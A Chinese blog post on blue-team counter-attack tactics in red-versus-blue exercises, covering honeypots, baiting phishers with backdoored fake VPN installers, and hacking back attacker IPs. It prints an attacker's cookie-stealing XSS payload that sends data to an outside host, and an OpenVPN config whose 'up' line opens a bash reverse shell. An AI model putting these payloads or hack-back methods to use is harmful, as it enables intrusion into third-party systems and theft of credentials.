---
layout: post
author: Vulkey_Chen
title: "浅谈蓝队反制手段"
date: 2020-09-03
music-id: 1403318151
permalink: /archives/2020-09-03/1
description: "浅谈蓝队反制手段"
---

# 浅谈蓝队反制手段

## 前言

网络安全攻防演习在国内已经逐渐常态化，从行业、区域（省份、地市）到部级...

2020年1月份开始到现在可以说基本上每个月都有1-3场HW，红与蓝的对抗从未停息。

红队的攻击技巧可以无穷无尽（扫描器、社工、0day、近源...），但是对于蓝队防守来说除了演习中常规的封IP、下线业务、看日志分析流量等“纯防守”操作以外，似乎实在是没有什么其他的防御手段了。

笔者在参与的几场攻防演习项目中担任“蓝队防守”角色，就发现了这一缺陷，似乎安全防御基础较弱的厂商再怎么充足的进行演习前准备，都只有乖乖的等待被“收割”。

转换一个思维，化被动为主动，尝试用“攻击”思路代入“防守”中，对“红队”进行反向捕获（反制）。

本文将总结案例和“反制”手段，文中不足之处还望各位斧正。

## 反制手段

### 蜜罐篇

#### 蜜罐设备

大部分厂商为了争取得到一些分数，都会采购/借用一些厂商的蜜罐设备，但蜜罐也分两类：传统、现代，两者从本质上还是有一定区别的，这里我简单说一下自己的理解。

**传统蜜罐：**蜜罐技术本质上是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的防御能力。

**现代蜜罐：**除了捕获分析攻击行为外，各类安全厂商在蜜罐产品中加入了“攻击者画像”这一功能作为“卖点”，而本质上攻击者画像是将第三方厂商漏洞转为画像探针，利用第三方厂商漏洞获取攻击者所在此类厂商网站业务上的个人信息，此类漏洞多半为前端类漏洞，例如：JSONP、XSS...除此之外还有网站伪造、自动投放蜜标等等众多丰富的功能。

所以传统蜜罐厂商在这一块的被“需要”不大，而现代蜜罐厂商在这一块往往有需要性很多，就冲“攻击者画像”这一方面在演习过程中就可以为防守方加分。

#### 蜜罐的反制

现代化蜜罐都做了哪些反制的操作呢？

1. 可克隆相关系统页面，伪装“漏洞”系统
2. 互联网端投饵，一般会在Github、Gitee、Coding上投放蜜标（有可能是个单独的网站地址、也有可能是个密码本引诱中招）
3. 利用JSONP、XSS、CSRF等前端类漏洞获取访问蜜标的攻击者网络身份（网络画像）

这样其实一条捕获链就出现了（仅仅是举例，其实更多的是对方在做信息收集的时候探测到了此端口）：

![-w645](/images/2020-09-03/15972454820428.jpg)


蜜罐的一些功能细节不过多赘述，比如利用JavaScript辨别人机、Cookie中种入ID防止切换IP之类的...如有兴趣想深入了解的朋友可以去相关厂商官网下载白皮书观看。

注：在实战演习过程中，仍然有许多攻击者中招，蜜罐会存储身份数据，并且会回传至厂商进行存储。

### 场景篇

#### 主动攻击“攻击IP”

防守日常就是看流量、分析流量，其中大部分都为扫描器流量，由于一般扫描器都会部署在VPS上，因此我们可以结合**流量监测平台**反向扫描。

![](/images/2020-09-03/15972858540088.jpg)

导出演习期间攻击IP列表，对IP进行端口扫描，从Web打入攻击IP机器内部。

![](/images/2020-09-03/15972858900640.jpg)

发现了一堆攻击IP机器上Web服务的漏洞：SQL注入、弱口令...拿下了一堆机器，也发现了大部分都是“被控主机”，而非购买的VPS，上面也大多是一些正常业务、非法业务在运转。

![](/images/2020-09-03/15972860516961.jpg)

除此之外，我们对所拿下的主机进行信息收集，发现了一个有意思的点，大部分机器为WAMP（Windows + Apache + Mysql + PHP），而根目录都存在着一个文件`images.php`。

![](/images/2020-09-03/15972862041058.jpg)

这是一个PHP脚本后门，我们通过分析该PHP文件又拿下数十台机器，对每台机器进行日志收集，分析IP关联性...整理报告上交裁判组判定。

#### 邮件钓鱼反制

安全防护基础较好的厂商，一般来说除了出动0day，物理近源渗透以外，最常见的就是邮件钓鱼了，在厂商收到邮件钓鱼的情况下，我们可以采取化被动为主动的方式，假装咬钩，实际上诱导攻击者进入蜜网。

```
北京时间 2019 年 5 月 15 日微软发布安全补丁修复了 CVE 编号为 CVE-2019-0708 的 Windows 远程桌面服务(RDP)远程代码执行漏洞，该漏洞在不需身份认证的情况下即可远程触发，危害与影响面极大。

受影响操作系统版本：

| Windows 7
| Windows Server 2008 R2
| Windows Server 2008
| Windows Server 2003
| Windows XP

由于该漏洞与去年的“Wannacry”勒索病毒具有相同等级的危害，由总行信息科技部研究决定，先推行紧急漏洞加固补丁，确保业务网、办公网全部修补漏洞，详情请阅读加固手册。

加固补丁程序解压密码：xxxx

xx信息科技部
xxxxx
xxx年xx月xx日
```

在某次演习期间，我们防守的客户单位就收到了钓鱼邮件，庆幸的是客户总体安全意识很强，加上有邮件沙箱的加持，并没有实际人员中招，而我们将计就计，部署一套虚假的内网环境，伪造钓鱼邮件中招假象，中招人员画像和机器环境编排：

**名字：**许晋 （jinxu）

**身份：**巡检职员

**平时上机内容：**看视频、打游戏、巡检

**系统软件：**Office三件套, 搜狗输入法, QQ, 微信, Xmind, 谷歌浏览器, Winrar, 迅雷, 百度网盘, Everything, 爱奇艺, 腾讯视频, QQ音乐, 网易云音乐, FastStone Capture....

**系统环境：**除了部署一些常见的系统软件，我们还要创建一系列工作文档（手工伪造、由客户提供非敏感公开数...），并在众多的工作文档中携带了我们部署的免杀后门（伪装成VPN安装包或办公软件）。

**目的：**点开钓鱼邮件的附件，假装中招后，让攻击者在翻当前PC机器的时候寻找到我们投下的假密码本，并结合VPN安装包，使得攻击者下载VPN安装包并进行安装，从而进行反向控制。

其中具体细节不过多赘述，套路都一样，在多次演习中都成功的反制到了攻击队的VPS，甚至在演习中我们拿下了攻击队的终端PC...

#### 盲打攻击反制

盲打攻击算是在演习中比较不常见的了，因为其效率不高，没办法直接的直控权限，但在攻击方穷途末路的时候往往也会选择使用盲打漏洞的方式来获取权限进而深入，比较常见的就属于盲打XSS了。

![](/images/2020-09-03/15974215989685.jpg)

一般盲打XSS都具备一个数据回传接口（攻击者需要接收Cookie之类的数据），接口在JavaScript代码中是可以寻找到的，我们可以利用数据回传接口做2件事情：

1. 打脏数据回传给XSS平台（捣乱）
2. 打虚假数据回传给XSS平台（诱导）

通常选择第二种方式更有意义，当然实在不行的情况下我们还是可以选择捣乱的...

首先，我们获取到了XSS盲打的代码：

```html
'"><sCRiPt sRC=https://XXXX/shX36></sCrIpT>
```

跟进SRC属性对应值（地址），获得如下JavaScript代码：

```javascript
(function(){(new Image()).src='https://XXXX/xss.php?do=api&id=shX36&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();if(''==1){keep=new Image();keep.src='https://XXXX/xss.php?do=keepsession&id=shX36&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
```

通过该段代码我们可以知道数据都回传到了这个接口上：`https://XXXX/xss.php?do=api&id=shX36&location=地址&toplocation=地址&cookie=Cookie信息&opener=`

我们制定了一个计划：发送假数据前往攻击者所使用的XSS信息接收平台，诱导攻击者进入蜜罐。

资源准备：公网域名解析蜜罐地址（需要客户网络安全部门具备一定的权利），蜜罐（需要具备蜜罐产品）伪造假后台，并部署虚假准入客户端下载；（【细节】当攻击者Cookie伪造进后台时会提示：当前登录IP不在准入名单）

![](/images/2020-09-03/15974225450599.jpg)

万事俱备只欠东风，对应参数传入虚假诱导数据（Location地址为查看留言信息的地址，Toplocation为引用该界面的地址，将用户名、密码写入到Cookie中配合“准入客户端”的诱导攻击）发送过去，等待攻击队上钩。

![](/images/2020-09-03/15974225704908.jpg)


### 技巧篇

技巧篇不过多讲解，懂得自然懂。

#### 虚假备份文件

配合蜜罐部署虚假漏洞，例如备份文件（WWW.rar）配合CVE-2018-20250漏洞。

参考：https://github.com/WyAtu/CVE-2018-20250

#### OpenVPN配置后门

OpenVPN配置文件（**OVPN文件**，是提供给OpenVPN客户端或服务器的配置文件）是可以修改并加入命令的。

OVPN文件最简单的形式如下：

```
remote 192.168.31.137
ifconfig 10.200.0.2 10.200.0.1
dev tun
```

> 以上文件表示，客户端会以开放的，不用身份验证或加密方式去连接IP为192.168.31.137的远程服务，在此过程中，会建立一种名为tun的路由模式，用它来在系统不同客户端间执行点对点协议，例如，这里的tun路由模式下，tun客户端为10.200.0.2，tun服务端为10.200.0.1，也就是本地的tun设备地址。这里的三行OVPN配置文件只是一个简单的示例，真正应用环境中的OVPN文件随便都是数百行，其中包含了很多复杂的功能配置。

OpenVPN 配置功能的 up 命令可以使得添加配置文件后执行我们所想让其执行的命令，官方文档中有说明：https://openvpn.net/community-resources/reference-manual-for-openvpn-2-0/

> 成功启用 TUN/TAP 模式后的 cmd 命令。
> 
> 该cmd命令中包含了一个脚本程序执行路径和可选的多个执行参数。这种执行路径和参数可由单引号或双引号，或者是反斜杠来强调，中间用空格区分。up命令可用于指定路由，这种模式下，发往VPN另一端专用子网的IP流量会被路由到隧道中去。

本质上，up命令会执行任何你指向的脚本程序。如果受害者使用的是支持`/dev/tcp`的Bash命令版本，那么在受害者系统上创建一个反弹控制 shell 轻而易举。就如以下OVPN文件中就可创建一个连接到 192.168.31.138:9090 的反弹shell。

```
remote 192.168.31.137
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.31.138/9090 0<&1 2>&1&'"
```

![-w797](/images/2020-09-03/15974251626915.jpg)

需要注意的是，up 命令需要成功连接主机才会执行，也就是说192.168.31.137需要真实存在。

#### 兵器漏洞

可以尝试挖掘蚁剑、冰蝎、菜刀、BurpSuite、SQLmap、AWVS的0day漏洞（需要一定的技术水平），或利用历史漏洞部署相关环境进行反打，例如蚁剑：https://gitee.com/mirrors/antSword/blob/master/CHANGELOG.md

历史版本中出现诸多XSS漏洞->RCE：

![-w942](/images/2020-09-03/15974256921135.jpg)


## 文末

只要思维活跃，枯燥无味的一件事情也可以变得生动有趣，生活如此，工作亦如此。

蓝队反制，需要具备这几个条件才能淋漓尽至的挥洒出来：

1. 客户安全相关部门的权力要高
2. 以自家厂商为主导的防守项目
3. 最好具备现成的现代蜜罐产品

未来，攻防对抗演习不仅仅是前几年所展示的那样：蓝队只要知道防守手段；而趋势将会慢慢的偏向于真正的攻防，蓝队不仅要会基本的防守手段，还要具备强悍的对抗能力，与红队进行对抗，这对蓝队成员的攻防技术水平也是一种更高的考验。

最后的最后：HACK THE WORLD - TO DO IT.

### Reference

对某攻击队的Webshell进行分析 - https://gh0st.cn/archives/2019-08-21/1

从OpenVPN配置文件中创建反弹Shell实现用户系统控制  - https://www.freebuf.com/articles/terminal/175862.html